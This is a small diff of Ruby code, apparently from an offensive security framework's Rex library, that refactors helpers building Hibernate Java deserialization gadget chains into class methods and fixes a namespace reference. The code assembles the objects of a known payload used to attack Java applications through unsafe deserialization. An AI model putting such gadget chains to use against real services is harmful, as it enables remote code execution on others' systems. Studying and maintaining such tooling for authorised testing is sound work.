@@ -36,7 +36,7 @@ module Rex
             Model::JavaObject.new('Ljava/util/HashMap;', 'elements' => { annot => nil, ah1 => nil })
           end
 
-          def make_typed_value(type, val, ver, entityMode: nil)
+          def self.make_typed_value(type, val, ver, entityMode: nil)
             if ver == 3
               Model::JavaObject.new('Lorg/hibernate/engine/TypedValue;', 
                                     'type' => type,
@@ -49,14 +49,14 @@ module Rex
             end
           end
 
-          def hibernate3_invoke_noarg(target, cls, method)
+          def self.hibernate3_invoke_noarg(target, cls, method)
             gc = 'Lorg/hibernate/property/Getter;'
             raise 'Unsupported, only getters' unless method.start_with?('get')
 
             get = Model::JavaObject.new('Lorg/hibernate/property/BasicPropertyAccessor$BasicGetter;', 'clazz' => Java::Serialize::JavaClass.new(cls),
                                                   'propertyName' => method[3].downcase + method[4..-1])
 
-            tup = Model::JavaObject.new('Lorg/hibernate/tuple/component/PojoComponentTuplizer;', 'getters' => JavaArray.new(gc, [get]),
+            tup = Model::JavaObject.new('Lorg/hibernate/tuple/component/PojoComponentTuplizer;', 'getters' => Model::JavaArray.new(gc, [get]),
                                                   'propertySpan' => 1)
 
             pojo = Model::JavaObject.new('Lorg/hibernate/EntityMode;', 'name' => 'POJO')
@@ -97,7 +97,7 @@ module Rex
             end
 
             tup = Model::JavaObject.new('Lorg/hibernate/tuple/component/PojoComponentTuplizer;', 
-                                        'getters' => JavaArray.new(gc, [get]),
+                                        'getters' => Model::JavaArray.new(gc, [get]),
                                         'propertySpan' => 1)
 
             ct = Model::JavaObject.new('Lorg/hibernate/type/ComponentType;', 
